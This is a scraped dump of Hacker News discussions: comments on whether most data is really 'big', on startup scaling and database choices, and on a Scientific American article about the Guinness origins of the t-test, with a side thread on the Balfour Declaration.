agorootparentIt could be a great question if you clarify the goals. As it stands it’s “here’s a problem, but secretly I have hidden constraints in my head you must guess correctly”. The OPs desired solution could have been found from probably some of those other candidates if asked “here is the challenge, solve in most McGuyver way possible”. Because if you change the second part, the correct answer changes. “Here is a challenge, solve in the most accurate, verifiable way possible” “Here is a challenge, solve in a way that enables collaboration” “Here is a challenge, 6TiB but always changing” ^ These are data science questions much more than the question he was asking. The answer in this case is that you’re not actually looking for a data scientist. reply hotstickyballs 5 hours agoparentprevAnd how many data scientists are familiar with using awk scripts? If you’re the only one then you’ll have failed at scaling the data science team. reply hipadev23 3 hours agoparentprevHuh? How are you proposing loading a 6TB CSV into memory multiple times? And then processing with awk, which generally streams one a line at a time. Obviously we can get boxes with multiple terabytes of RAM for $50-200/hr on-demand but nobody is doing that and then also using awk. They’re loading the data into clickhouse or duckdb (at which point the ram requirement is probably 64-128GB) I feel like this is an anecdotal story that has mixed up sizes and tools for dramatic effect. reply michaelcampbell 4 hours agoparentprevMy smartphone cannot store 1TiB.reply 6510 4 hours agoparentprevI dont know anything but when doing that I always end up next Thursday having the same with 4TB and the next with 17 at which point I regret picking a solution that fit so exactly. reply wslh 7 hours agoparentprevIn my context 99% of the problem is the ETL, nothing to do with complex technology. I see people stuck when they need to get this from different sources in different technologies and/or APIs. reply blagie 8 hours agoprevOverall, I agree with much of this post, but there are several caveats: 1) Mongo is a bad point of reference. The one lesson I've learned is that there is nothing Mongo does which postgresql doesn't do better. Big data solutions aren't nosql / mongo, but usually things like columnar databases, map/reduce, Cassandra, etc. 2) Plan for success 95% of businesses never become unicorns, but that's the goal for most (for the 5% which do). If you don't plan for it, you won't make it. The reason to architect for scalability when you have 5 customers is so if that exponential growth cycle hits, you can capitalize on it. That's not just architecture. To have any chance of becoming a unicorn, every part of the business needs to be planned for now and for later: How do we make this practical / sustainable today? How do we make sure it can grow later when we have millions of customers? A lot of this can be left as scaffolding (we'll swap in [X], but for now, we'll do [Y]). But the key lessons are correct: - Most data isn't big. I can fit data about every person in the world on a $100 Chromebook. (8 billion people * 8 bits of data = 8GB) - Most data is rarely queried, and most queries are tiny. The first step in most big data jobs I've done is taking terabytes of data and shrinking it down to the GB, MB, or oven KB-scale data I need. Caveat: I have no algorithm for predicting what I'll need in the future. - Cost of data is increasing with regulatory. reply davedx 8 hours agoparent> 2) Plan for success 95% of businesses never become unicorns, but that's the goal for most (for the 5% which do). If you don't plan for it, you won't make it. That's exactly what every architecture astronaut everywhere says. In my experience it's completely untrue, and actually \"planning for success\" more often than not causes huge drags on productivity, and even more important for startups, on agility. Because people never just make plans, they usually implement too. Plan for the next 3 months and you'll be much more agile and productive. Your startup will never become a unicorn if you can't execute. reply newaccount74 7 hours agorootparentThe biggest problem with planning for scale is that engineers often have no idea what problems they will actually run into when they scale and they build useless shit that slows them down and doesn't help later at all. I've come to the conclusion that the only strategy that works reliably is to build something that solves problems you have NOW rather than trying to predict the future. reply vegetablepotpie 6 minutes agorootparentThe flip side of that is that you end up with spaghetti code that is expensive to add features to and is expensive to clean up when you are successful. Then people in the business implement workarounds to handle special cases that are undocumented and hidden. reply fuzzy2 7 hours agorootparentprevExactly this. Not only would they not know the tech challenges, they also wouldn’t know the business/domain challenges. reply MOARDONGZPLZ 8 hours agorootparentprevIn my experience the drag caused from the thinking to plan for scalability early has been so much greater than the effort to rearchitect things when and if the company becomes a unicorn that one is significantly more likely to become a unicorn if they simply focus on execution and very fast iteration and save the scalability until it’s actually needed (and they can hire a team of whomever to effect this change with their newly minted unicorn cachet). reply CuriouslyC 6 hours agorootparentprevThere's writing code to handle every eventuality, and there's considering 3-4 places you MIGHT pivot and making sure you aren't making those pivots harder than they need to be. reply blagie 5 hours agorootparentThis is exactly what I try to do and what I've seen successful systems do. Laying out adjacent markets, potential pivots, likely product features, etc. is a weekend-long exercise. That can help define both where the architecture needs to be flexible, and just as importantly, *where it does not*. Over-engineering happens when you plan / architect for things which are unlikely to happen. reply blagie 5 hours agorootparentprev> That's exactly what every architecture astronaut everywhere says. In my experience it's completely untrue, and actually \"planning for success\" more often than not causes huge drags on productivity, and even more important for startups, on agility. Because people never just make plans, they usually implement too. That's not my experience at all. Architecture != implementation Architecture astronauts will try to solve the world's problems in v0. That's very different from having an architectural vision and building a subset of it to solve problems for the next 3 months. Let me illustrate: * Agile Idiot: We'll stick it all in PostgreSQL, however it fits, and meet our 3-month milestone. [Everything crashes-and-burns on success] * Architecture Astronaut: We'll stick it all in a high-performance KVS [Business goes under before v0 is shipped] * Success: We have one table which will grow to petabytes if we reach scale. We'll stick it all in postgresql for now, but maintain a clean KVS abstraction for that one table. If we hit success, we'll migrate to [insert high-performance KVS]. All the other stuff will stay in postgresql. The trick is to have a pathway to success while meeting short-term milestones. That's not just software architecture. That's business strategy (clean beachhead, large ultimate market), and every other piece of designing a successful startup. There should be a detailed 3-month plan, a long-term vision, and a rough set of connecting steps. reply Spooky23 6 hours agorootparentprevThe exception is when you have people with skills in particular tools. The suggestion upthread to use awk is awesome if you’re a bunch of Linux grey beards. But if you have access to people with particular skills or domain knowledge… spending extra cash on silly infrastructure is (within reason) way cheaper than having that employee be less productive. reply abetusk 5 hours agorootparentprevAnother way to say that is that \"planning for success\" is prematurely optimizing for scale. Scaling up will bring its own challenges, with many of them difficult to foresee. reply smrtinsert 7 hours agorootparentprevThe success planners almost always seem to be the same ones pushing everyone to \"not overengineer\". Uhhhh.. reply littlestymaar 5 hours agorootparentprevThis. If you plan for the time you'll be a unicorn, you will never get anything done in the first place, let alone being a unicorn. When you plan for the next 3 month, then hopefully in three month you're still here to plan for the next quarter again. reply boxed 7 hours agoparentprevI see people planning for success to the point of guaranteeing failure, much more than people who suddenly must try to handle success in panic. It's a second system syndrome + survivor bias thing I think: people who had to clean up the mess of a good MVP complaining about what wasn't done before. But the companies that DID do that planning and architecting before did not survive to be complained about. reply CuriouslyC 6 hours agorootparentIt's not either or. There are best practices that can be followed regardless with no time cost up front, and there is taking some time to think about how your product might evolve (which you really should be doing anyhow) then making choices with your software that don't make the evolution process harder than it needs to be. Layers of abstraction make code harder to reason about and work with, so it's a lose lose when trying to iterate quickly, but there's also the idea of architectural \"mise en place\" vs \"just dump shit where it's most convenient right now and don't worry about later\" which will result near immediate productivity losses due to system incoherence and disorganization. reply boxed 5 hours agorootparentI'm a big fan of \"optimize for deletion\" (aka leaf-heavy) code. It's good for reasoning when the system is big, and it's good for growing a code base. It's a bit annoying how the design of Django templates works against this by not allowing free functions... reply notachatbot1234 8 hours agoparentprev> - Most data isn't big. I can fit data about every person in the world on a $100 Chromebook. (8 billion people * 8 bits of data = 8GB) Nitpick but I cannot help myself: 8 bits are not even enough for a unique integer ID per person, that would require 8 bytes per person and then we are at 60GB already. I agree with pretty much anything else you said, just this stood out as wrong and Duty Calls. reply amenhotep 7 hours agorootparentSure it is. You just need a one to one function from person to [0, eight billion]. Use that as your array index and you're golden. 8 GB is overkill, really, you could pack some boolean datum like \"is over 18\" into bits within the bytes and store your database in a single gigabyte. Writing your mapping function would be tricky! But definitely theoretically possible. reply blagie 5 hours agorootparentI'm old enough to have built systems with similar techniques. We don't do that much anymore since we don't need to, but it's not rocket science. We had spell checkers before computers had enough memory to fit all words. They'd probabilistically find almost all incorrect words (but not suggest corrections). It worked fine. reply iraqmtpizza 8 hours agorootparentprevmeh. memory address is the ID reply L-four 7 hours agorootparentAirline booking numbers used to just be the sector number of your booking record on the mainframes HDD. reply devsda 4 hours agorootparentThis is such a simple scheme. I wonder how they dealt with common storage issues like backups and disks having bad sectors. reply giantrobot 2 hours agorootparentThey're likely record based formatting rather than file based. At the high level the code is just asking for a record number from a data set. The data set is managed including redundancy/ECC by the hardware of that storage device. reply rrr_oh_man 7 hours agorootparentprevThat’s why they were constantly recycled? reply switch007 7 hours agorootparentprevMy jaw just hit the floor. What a fascinating fact! reply mauriciolange 7 hours agorootparentprevsource? reply underwater 8 hours agoparentprev> To have any chance of becoming a unicorn, every part of the business needs to be planned for now and for later I think that in practice that’s counterproductive. A startup has a limited runway. If your engineers are spending your money on something that doesn’t pay off for years then they’re increasing the chance you’ll fail before it matters. reply blagie 5 hours agorootparentYou're confusing planning with implementation. Planning is a weekend, or at most a few weeks. reply zemo 6 hours agoparentprev> The reason to architect for scalability when you have 5 customers is so if that exponential growth cycle hits, you can capitalize on it. If you have a product gaining that much traction, it’s usually because of some compound effect based on the existence and needs of its userbase. If on the way up you stumble to add new users, the userbase that’s already there is unlikely to go back to the Old Thing or go somewhere else (because these events are actually rare). For a good while using Twitter meant seeing the fail whale every day. Most people didn’t just up and leave, and nothing else popped up that could scale better that people moved to. Making a product that experiences exponential growth in that way is pretty rare, and struggling to scale those cases and having a period of availability degradation is common. What products hit an exponential growth situation failed because they couldn’t scale? reply OJFord 8 hours agoparentprev> 95% of businesses never become unicorns, but that's the goal for most (for the 5% which do). I think you're missing quite a few 9s! reply nemo44x 6 hours agoparentprevMongo allows a developer to burn down a backlog faster than anything else. That’s why it’s so popular. The language drivers interface with the database which just says yes. And whatever happens later is someone else’s problem. Although it’s a far more stable thing today. reply brtkdotse 8 hours agoparentprev> 95% of businesses never become unicorns, but that's the goal for most Is it really the general case or is it just a HN echo chamber meme? My pet peeve is that patterns used by companies that in theory could become global unicorns are mimicked by companies where 5000 paying customers would mean an immense success reply blagie 8 hours agorootparentIt's neither. Lifestyle companies are fine, if that's what you're aiming for. I know plenty of people who run or work at ≈1-30 person companies with no intention to grow. However, if you're going for high-growth, you need to plan for success. I've seen many potential unicorns stopped by simple lack of planning early on. Despite all the pivots which happen, if you haven't outlined a clear path from 1-3 people in a metaphorical garage to reaching $1B, it almost never happens, and sometimes for stupid reasons. If your goal is 5000 paying customers at $100 per year and $500k in annual revenues, that can lead to a very decent life. However, it's an entire different ballgame: (1) Don't take in investment (2) You probably can't hire more than one person (3) You need a plan for break-even revenue before you need to quit your job / run out of savings. (4) You need much greater than the 1-in-10 odds of success. And it's very possible (and probably not even hard) to start a sustainable 1-5 person business with >>50% odds of success, especially late career: - Find a niche you're aware of from your job - Do ballpark numbers on revenues. These should land in the $500k-$10M range. Less, and you won't sustain. More, and there will be too much competition. - Do it better than the (likely incompetent or non-existent) people doing it now - Use your network of industry contacts to sell it That's not a big enough market you need to worry about a lot of competition, competitors with VC funding, etc. Especially ones with tall moats do well -- pick some unique skillset, technology, or market access, for example. However, IF you've e.g. taken in VC funding, then you do need to plan for growth, and part of that is planning for the small odds your customer base (and ergo, your data) does grow. reply IneffablePigeon 6 hours agorootparentIf you’re in b2b 5000 customers can be a lot more revenue than that. 10-100x, depending hugely on industry and product. reply davedx 8 hours agorootparentprevIt's definitely an echo chamber. Most companies definitely do not want to become \"unicorns\" - most SME's around the world don't even know what a \"unicorn\" is, let alone be in an industry/sector where it's possible. Does a mining company want to become a \"unicorn\"? A fish and chip shop? Even within tech there is an extremely large number of companies whose goals are to steadily increase profits and return them to shareholders. 37 Signals is the posterchild there. Maybe if you're a VC funded startup then yeah. reply threeseed 8 hours agorootparentprevHN is the worst echo chamber around. Obsessed with this \"you must use PostgreSQL for every use case\" nonsense. And that anyone who actually has unique data needs is simply doing it for their resume or are over-engineering. reply paulryanrogers 7 hours agorootparent> Obsessed with this \"you must use PostgreSQL for every use case\" nonsense. Pg fans are certainly here asking \"why not PG?\". Yet so are fans of other DBs; like DuckDB, CouchDB, SQLite, etc. reply internet101010 2 hours agorootparentI don't see so much DuckDB and CouchDB proselytizing but the SQLite force always out strong. I tend to divide the Postgres vs. SQLite decision on if the data in question is self-contained. Like am I pulling data from elsewhere (Postgres) or am I creating data within the application that is only used for the functionality of said application (SQLite). reply babel_ 7 hours agorootparentprevMany startups seem to aim for this, naturally it's difficult to put actual numbers to this, and I'm sure many pursue multiple aims in the hope one of them sticks. Since unicorns are really just describing private valuation, really it's the same as saying many aim to get stupendously wealthy. Can't put a number on that, but you can at least see it's a hope for many, though \"goal\" is probably making it seem like they've got actually achievable plans for it... That, at least, I'm not so convinced of. Startups are, however, atypical from new businesses, ergo the unicorn myth, meaning we see many attempts to follow such a path that likely stands in the way of many new businesses from actually achieving the more real goals of, well, being a business, succeeding in their venture to produce whatever it is and reach their customers. I describe it as a unicorn \"myth\" as it very much behaves in such a way, and is misinterpreted similarly to many myths we tell ourselves. Unicorns are rare and successful because they had the right mixture of novel business and the security of investment or buyouts. Startups purportedly are about new ways of doing business, however the reality is only a handful really explore such (e.g. if it's SaaS, it's probably not a startup), meaning the others are just regular businesses with known paths ahead (including, of course, following in the footsteps of prior startups, which really is self-refuting). With that in mind, many of the \"real\" unicorns are realistically just highly valued new businesses (that got lucky and had fallbacks), as they are often not actually developing new approaches to business, whereas the mythical unicorns that startups want to be are half-baked ideas of how they'll achieve that valuation and wealth without much idea of how they do business (or that it can be fluid, matching their nebulous conception of it), just that \"it'll come\", especially with \"growth\". There is no nominative determinism, and all that, so businesses may call themselves startups all they like, but if they follow the patterns of startups without the massive safety nets of support and circumstance many of the real unicorns had, then a failure to develop out the business proper means they do indeed suffer themselves by not appreciating 5000 paying customers and instead aim for \"world domination\", as it were, or acquisition (which they typically don't \"survive\" from, as an actual business venture). The studies have shown this really does contribute to the failure rate and instability of so-called startups, effectively due to not cutting it as businesses, far above the expected norm of new businesses... So that pet peeve really is indicative of a much more profound issue that, indeed, seems to be a bit of an echo chamber blind spot with HN. After all, if it ought to have worked all the time, reality would look very different from today. Just saying how many don't become unicorns (let alone the failure rate) doesn't address the dissonance from then concluding \"but this time will be different\". It also doesn't address the idea that you don't need to become a \"unicorn\", and maybe shouldn't want to either... but that's a line of thinking counter to the echo chamber, so I won't belabour it here. reply Toine 7 hours agoparentprev> To have any chance of becoming a unicorn, every part of the business needs to be planned for now and for later Sources ? reply threeseed 8 hours agoparentprev> nothing Mongo does which postgresql doesn't do better a) It has a built-in and supported horizontal scalability / HA solution. b) For some use cases e.g. star schemas it has significantly better performance. > Big data solutions aren't nosql Almost all big data storage solutions are NoSQL. reply ozkatz 6 hours agorootparent> Almost all big data storage solutions are NoSQL. I think it's important to distinguish between OLAP AND OLTP. For OLAP use cases (which is what this post is mostly about) it's almost 100% SQL. The biggest players being Databricks, Snowflake and BigQuery. Other tools may include AWS's tools (Glue, Athena), Trino, ClickHouse, etc. I bet there's aAlmost all big data storage solutions are NoSQL. Most I've seen aren't. NoSQL means non-relational database. Most big data solutions I've seen will not use a database at all. An example is hadoop. Once you have a database, SQL makes a lot of sense. There are big data SQL solutions, mostly in the form of columnar read-optimized databases. On the above, a little bit of relational can make a huge performance difference, in the form of, for example, a big table with compact data with indexes into small data tables. That can be algorithmically a lot more performant than the same thing without relations. reply lokimedes 7 hours agoprevI was a researcher at the Large Hadron Collider around the time “Big Data” became a thing. We had one of the use cases where analyzing all the data made sense, since it boiled down to frequentist statistics, the more data, the better. Yet even with a global network of supercomputers at our disposal, we funnily figured out that fast local storage was better than waiting for huge jobs to finish. So, surprise, surprise, every single grad student managed somehow to boil the relevant data for her analysis down to exactly 1-5 TB, without much loss in analysis flexibility. There must be like a law of convenience here, that rivals Amdahl’s scaling law. reply marcosdumay 4 hours agoparentLet me try one: \"If you can't do your statistical analysis in 1 to 5 TB of data, your methodology is flawed\" This is probably more about human limitations than math. There's a clear ceiling in how much flexibility we can use. That will also change with easier ways to run new kinds of analysis, but it increases with the logarithm of the amount of things we want to do. reply civilized 6 hours agoparentprevI think there is a law of convenience, and it also explains why many technologies improve at a consistent exponential rate. People are very good at finding convenient ways to make something a little better each year, but every idea takes some minimal time to execute. reply msl09 6 hours agoparentprevI think that your law of convenience is spot on. One thing that got by talking with commercial systems devs is that they are always under pressure by their clients to make their systems as cheap as possible, reducing the database stored and the size of the computations is one great way to minimize the client's monthly bill. reply 81 more comments... GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Jordan Tigani argues that the era of Big Data is over, as most organizations do not handle massive data volumes and struggle to derive actionable insights.",
      "Traditional data management systems like SQLite, Postgres, and MySQL are resurging, while NoSQL and NewSQL systems stagnate, with data sizes often under a terabyte.",
      "Modern cloud platforms separate storage and compute, enabling scalable and cost-effective data management, shifting the focus from data size to efficient data usage and decision-making."
    ],
    "commentSummary": [
      "A Motherduck.com user shared an interview experience where managing 6 TiB of data was a key task, sparking debate on the fairness and effectiveness of trick questions in interviews.",
      "The discussion highlighted the importance of assessing candidates' thought processes, the lasting relevance of SQL and relational databases, and the benefits of simpler, cost-effective data management tools.",
      "It also critiqued the tech community's echo chamber effect, emphasizing sustainable growth over chasing unicorn status and the balance between rapid software development and careful planning."
    ],
    "points": 412,
    "commentCount": 334,
    "retryCount": 0,
    "time": 1716798605
  },
  {
    "id": 40485313,
    "title": "The t-test: A Statistical Breakthrough Born at the Guinness Brewery",
    "originLink": "https://www.scientificamerican.com/article/how-the-guinness-brewery-invented-the-most-important-statistical-method-in/",
    "originBody": "Opinion May 25, 2024 6 min read How the Guinness Brewery Invented the Most Important Statistical Method in Science The most common test of statistical significance originated from the Guinness brewery. Here’s how it works By Jack Murtagh The gates of the Guinness Saint James Gate Brewery stand in Dublin, Ireland. Hollie Adams/Bloomberg via Getty Images “One Guinness, please!” says a customer to a barkeep, who flips a branded pint glass and catches it under the tap. The barkeep begins a multistep pour process lasting precisely 119.5 seconds, which, whether it’s a marketing gimmick or a marvel of alcoholic engineering, has become a beloved ritual in Irish pubs worldwide. The result: a rich stout with a perfect froth layer like an earthy milkshake. The Guinness brewery has been known for innovative methods ever since founder Arthur Guinness signed a 9,000-year lease in Dublin for £45 a year. For example, a mathematician-turned-brewer invented a chemical technique there after four years of tinkering that gives the brewery’s namesake stout its velvety head. The method, which involves adding nitrogen gas to kegs and to little balls inside cans of Guinness, led to today’s hugely popular “nitro” brews for beer and coffee. But the most influential innovation to come out of the brewery by far has nothing to do with beer. It was the birthplace of the t-test, one of the most important statistical techniques in all of science. When scientists declare their findings “statistically significant,” they very often use a t-test to make that determination. How does this work, and why did it originate in beer brewing, of all places? On supporting science journalism If you're enjoying this article, consider supporting our award-winning journalism by subscribing. By purchasing a subscription you are helping to ensure the future of impactful stories about the discoveries and ideas shaping our world today. Near the start of the 20th century, Guinness had been in operation for almost 150 years and towered over its competitors as the world’s largest brewery. Until then, quality control on its products consisted of rough eyeballing and smell tests. But the demands of global expansion motivated Guinness leaders to revamp their approach to target consistency and industrial-grade rigor. The company hired a team of brainiacs and gave them latitude to pursue research questions in service of the perfect brew. The brewery became a hub of experimentation to answer an array of questions: Where do the best barley varieties grow? What is the ideal saccharine level in malt extract? How much did the latest ad campaign increase sales? Shuyao Xiao Amid the flurry of scientific energy, the team faced a persistent problem: interpreting its data in the face of small sample sizes. One challenge the brewers confronted involves hop flowers, essential ingredients in Guinness that impart a bitter flavor and act as a natural preservative. To assess the quality of hops, brewers measured the soft resin content in the plants. Let’s say they deemed 8 percent a good and typical value. Testing every flower in the crop wasn’t economically viable, however. So they did what any good scientist would do and tested random samples of flowers. Let’s inspect a made-up example. Suppose we measure soft resin content in nine samples and, because samples vary, observe a range of values from 4 percent to 10 percent, with an average of 6 percent—too low. Does that mean we should dump the crop? Uncertainty creeps in from two possible explanations for the low measurements. Either the crop really does contain unusually low soft resin content, or though the samples contain low levels, the full crop is actually fine. The whole point of taking random samples is to rely on them as faithful representatives of the full crop, but perhaps we were unlucky by choosing samples with uncharacteristically low levels. (We only tested nine, after all.) In other words, should we consider the low levels in our samples significantly different from 8 percent or mere natural variation? This quandary is not unique to brewing. Rather, it pervades all scientific inquiry. Suppose that in a medical trial, both the treatment group and placebo group improve, but the treatment group fares a little better. Does that provide sufficient grounds to recommend the medication? What if I told you that both groups actually received two different placebos? Would you be tempted to conclude that the placebo in the group with better outcomes must have medicinal properties? Or could it be that when you track a group of people, some of them will just naturally improve, sometimes by a little and sometimes by a lot? Again, this boils down to a question of statistical significance. The theory underlying these perennial questions in the domain of small sample sizes hadn’t been developed until Guinness came on the scene—specifically, not until William Sealy Gosset, head experimental brewer at Guinness in the early 20th century, invented the t-test. The concept of statistical significance predated Gosset, but prior statisticians worked in the regime of large sample sizes. To appreciate why this distinction matters, we need to understand how one would determine statistical significance. Shuyao Xiao Remember, the hops samples in our scenario have an average soft resin content of 6 percent, and we want to know whether the average in the full crop actually differs from the desired 8 percent or if we just got unlucky with our sample. So we’ll ask the question: What is the probability that we would observe such an extreme value (6 percent) if the full crop was in fact typical (with an average of 8 percent)?Traditionally, if this probability, called a P value, lies below 0.05, then we deem the deviation statistically significant, although different applications call for different thresholds. Often two separate factors affect the P value: how far a sample deviates from what is expected in a population and how common big deviations are. Think of this as a tug-of-war between signal and noise. The difference between our observed mean (6 percent) and our desired one (8 percent) provides the signal—the larger this difference, the more likely the crop really does have low soft resin content. The standard deviation among flowers brings the noise. Standard deviation measures how spread out the data are around the mean; small values indicate that the data hover near the mean, and larger values imply wider variation. If the soft resin content typically fluctuates widely across buds (in other words, has a high standard deviation), then maybe the 6 percent average in our sample shouldn’t concern us. But if flowers tend to exhibit consistency (or a low standard deviation), then 6 percent may indicate a true deviation from the desired 8 percent. To determine a P value in an ideal world, we’d start by calculating the signal-to-noise ratio. The higher this ratio, the more confidence we have in the significance of our findings because a high ratio indicates that we’ve found a true deviation. But what counts as high signal-to-noise? To deem 6 percent significantly different from 8 percent, we specifically want to know when the signal-to-noise ratio is so high that it only has a 5 percent chance of occurring in a world where an 8 percent resin content is the norm. Statisticians in Gosset’s time knew that if you were to run an experiment many times, calculate the signal-to-noise ratio in each of those experiments and graph the results, that plot would resemble a “standard normal distribution”—the familiar bell curve. Because the normal distribution is well understood and documented, you can look up in a table how large the ratio must be to reach the 5 percent threshold (or any other threshold). Gosset recognized that this approach only worked with large sample sizes, whereas small samples of hops wouldn’t guarantee that normal distribution. So he meticulously tabulated new distributions for smaller sample sizes. Now known as t-distributions, these plots resemble the normal distribution in that they’re bell-shaped, but the curves of the bell don’t drop off as sharply. That translates to needing an even larger signal-to-noise ratio to conclude significance. His t-test allows us to make inferences in settings where we couldn’t before. Mathematical consultant John D. Cook mused on his blog in 2008 that perhaps it should not surprise us that the t-test originated at a brewery as opposed to, say, a winery. Brewers demand consistency in their product, whereas vintners revel in variety. Wines have “good years,” and each bottle tells a story, but you want every pour of Guinness to deliver the same trademark taste. In this case, uniformity inspired innovation. Gosset solved many problems at the brewery with his new technique. The self-taught statistician published his t-test under the pseudonym “Student” because Guinness didn’t want to tip off competitors to its research. Although Gosset pioneered industrial quality control and contributed loads of other ideas to quantitative research, most textbooks still call his great achievement the “Student’s t-test.” History may have neglected his name, but he could be proud that the t-test is one of the most widely used statistical tools in science to this day. Perhaps his accomplishment belongs in Guinness World Records (the idea for which was dreamed up by Guinness’s managing director in the 1950s). Cheers to that. Rights & Permissions Jack Murtagh writes about math and puzzles, including a series on mathematical curiosities at Scientific American and a weekly puzzle column at Gizmodo. He holds a Ph.D. in theoretical computer science from Harvard University. Follow Murtagh on X @JackPMurtagh More by Jack Murtagh",
    "commentLink": "https://news.ycombinator.com/item?id=40485313",
    "commentBody": "The t-test was invented at the Guinness brewery (scientificamerican.com)361 points by rmason 22 hours agohidepastfavorite117 comments killjoywashere 17 hours agoAnother fun bit of biochemical history: Chaim Weizmann (1) was a biochemist and staunch Zionist who gained the attention of First Lord of the British Admiralty, Winston Churchill, for cultivating a bacterium, Clostridium acetobutylicum, that could produce acetone, which was in short supply and required for the production of cordite, the key propellent in naval artillery during World War I. In gratitude for Weizmann's contribution to the war effort, George Lloyd asked him what Britain could do for him, to which he replied \"not for me, but for my people\", which begat the Balfour Declaration (2) establishing Britain's commitment to provide a Home for the Jewish People (3). (1) https://en.wikipedia.org/wiki/Chaim_Weizmann (2) https://en.wikipedia.org/wiki/Balfour_Declaration (3) It is essentially lost to history that the Balfour Declaration also provided that the Palestinian people should not be displaced. It is also mostly lost to history that there was a great deal of politicking between Weizmann arriving in England and his audience with George Lloyd, including a world tour Weizmann orchestrated to promote one Albert Einstein. reply fsckboy 3 minutes agoparent> It is essentially lost to history that the Balfour Declaration also provided that the Palestinian people should not be displaced. It is equally essentially lost on most people today, that the Balfour Declaration did not create the state of Israel, nor did the United Nations create it, nor the UK, nor the US, nor was it post-war \"resettlement plan\" for displaced Jews by the Allies. To the contrary, Jews at that time were barred from entering the British Mandate. Israelis declared themselves a state, similar to Americans declaring themselves independent of Britain, against the wishes of the UK. So it should also be noted that no \"plan\" for that region called for a civil war: but a civil war broke out. So it's revisionist shoehorning of the events that played out to say that they didn't match such and such of various plans that may have previously been made but never came to fruition. The cis-Jordan Arabs were not treated worse by the Israelis than they themselves were attempting to treat the Israelis; the Arabs did lose the military conflict, however, after which they displaced their own longstanding Jewish populations. reply leoc 3 hours agoparentprevI'm not saying that this is a bad comment, or that it should not have been made; but at the same time, I am also a bit wearied to see that the HN comment section has achieved a Time To Palestine of 1 on this post. reply jhardy54 1 hour agorootparentI'm not saying that this is a bad comment, or that it should not have been made; but at the same time, I am also a bit wearied to see that the HN comment section has achieved a Time To “Time To Palestine” Palestine of 2 on this post. reply DiggyJohnson 40 minutes agorootparentThese low effort posts are against the HN guidelines and also not terribly clever. reply pjmorris 5 hours agoparentprev> \"It is essentially lost to history\" In practice, this is clearly true. But it is not for lack of trying, at least on some people's parts. I recently read 'A Peace to End All Peace', David Fromkin, which goes in depth into the background here, including Weizmann's role and the making of the Balfour declaration. A passage from the book's conclusion has stuck with me: \"It took Europe a millennium and a half to resolve its post-Roman crisis of social and political identity: nearly a thousand years to settle on the nation-state form of political organization, and nearly five hundred years more to determine which nations were entitled to be states. Whether civilization would survive the raids and conflicts of rival warrior bands; whether church or state, pope or emperor, would rule; whether Catholic or Protestant would prevail in Christendom; whether dynastic empire, national state, or city-state would command fealty; and whether, for example, a townsman of Dijon belonged to the Burgundian or to the French nation, were issues painfully worked out through ages of searching and strife, during which the losers—the Albigensians of southern France, for example—were often annihilated. It was only at the end of the nineteenth century, with the creation of Germany and Italy, that an accepted map of western Europe finally emerged, some 1,500 years after the old Roman map started to become obsolete. The continuing crisis in the Middle East in our time may prove to be nowhere near so profound or so long-lasting. But its issue is the same: how diverse peoples are to regroup to create new political identities for themselves after the collapse of an ages-old imperial order to which they had grown accustomed.\" reply insane_dreamer 4 hours agorootparentOne big difference with the Middle East is that the present day borders were largely drawn up by foreign powers (England, France) rather than evolving organically as they did in post-Roman Europe. This is also a source of much of the ongoing conflicts in the region including Israel/Palestine. reply readthenotes1 2 hours agorootparentTBF, England and France took hundreds of years drawing up their own borders between each other reply rmason 16 hours agoparentprevI continue to be amazed the things you learn on HN. When I was in Poland last summer I learned that a number of Jewish leaders there between the two world wars advocated for a Jewish homeland. But they were never able to convince the government to publicly declare that support. Despite the fact at the time Jews made up to 25% of Poland's population. reply acidioxide 11 hours agorootparentThat's wrong. Polish state from 1926 onwards supported Zionists (in the years 1926-1939, Poland was ruled by the authoritarian Sanation movement). reply rmason 9 hours agorootparentVerified you are correct. Yet the museums I toured in both Warsaw and Gdansk gave me the exact opposite impression. reply cafard 7 hours agoparentprevPedantry: David Lloyd George, Prime Minister during the later part of WW I and for a time after. reply jojobas 14 hours agoparentprev> Palestinian people should not be displaced This was always wishful thinking at best, and more realistically a lie. reply cnlevy 12 hours agorootparentHmmm, those palestinian Arabs that made peace with the Jews in the 1948 civil war are still there; see https://en.m.wikipedia.org/wiki/Abu_Ghosh https://en.m.wikipedia.org/wiki/Umm_al-Fahm reply jojobas 11 hours agorootparentDoesn't prove much. The Jews needed the fertile lands that were very much settled, there were not all flocking there for some desert. Quoting Ben-Gurion: A people which fights against the usurpation of its land will not tire so easily. ... When we say that the Arabs are the aggressors and we defend ourselves — this is only half the truth. ... [P]olitically we are the aggressors and they defend themselves. The country is theirs, because they inhabit it, whereas we want to come here and settle down, and in their view we want to take away from them their country. reply riffraff 14 hours agoparentprevI've heard that tour was also accidentally the reason Einstein became such a household name and face, tho I'm not so convinced this is true. reply racional 3 hours agoparentprev\"Britain's commitment to provide a Home for the Jewish People ... in a place other than Europe\" is the key detail that's missing here. It wasn't like they all got together and said, you know, it's time we did the Jewish People a solid for once. reply adhamsalama 1 hour agoparentprevWell, now I hate him. Thanks. reply hnbad 6 hours agoparentprevIt also can't be overstated that Balfour himself was a staunch racist and antisemite. His motivation for passing the Declaration was at least in part the idea that if the UK gives the Jews their own country, the UK will have a powerful ally in the global Jewish conspiracy - and also encourage Jews to leave the UK and not manipulate in its politics, culture and economy. From Balfour's own writing in 1919 cited in his Wikipedia article: > [Zionism would] mitigate the age-long miseries created for Western civilization by the presence in its midst of a Body [the Jews] which it too long regarded as alien and even hostile, but which it was equally unable to expel or to absorb. He's the best example how support of Zionism and antisemitism aren't mutually contradictory and can actually go hand in hand. It's likewise often lost on people that there was a Zionist project helping German Jews emigrate to Palestine with support of the German government even after Hitler came to power, although of course (like all migration) it ended with the beginning of World War 2. This isn't to say the Nazis were fond of this project but they didn't actively oppose it. They did however pass laws requiring emigrating Jews to liquidate their assets (i.e. sell off any businesses or property) and significantly limiting the amount of wealth they could transfer out of the country just like they later dispossessed (and subsequently re-privatized) Jewish business owners and confiscated their property during the Holocaust. reply zabzonk 16 hours agoparentprevnext [8 more] [flagged] jolj 13 hours agorootparentdepends on who you ask, for german jews under the nazis before world war 2, it was almost the only place to go to, and definitely saved them from certain death in places like the netherlands. not to mention after world war 2 for those who came back from the camps and found their homes taken. moreover zionism did not start with the balfour declaration, but decades before with mass killings of jews in eastern europe reply zabzonk 10 hours agorootparentthe western allies certainly could and should have done much pre-war, and arguably in the war (mosquito strikes on the camps, for example). my point was that few can dispute that, as we see today, the whole imposition of israel on its neighbours has been a disaster. reply jolj 9 hours agorootparentthat's only when taking only palestinians into account. When the balfour declaration was signed already 10% of then population was jewish. 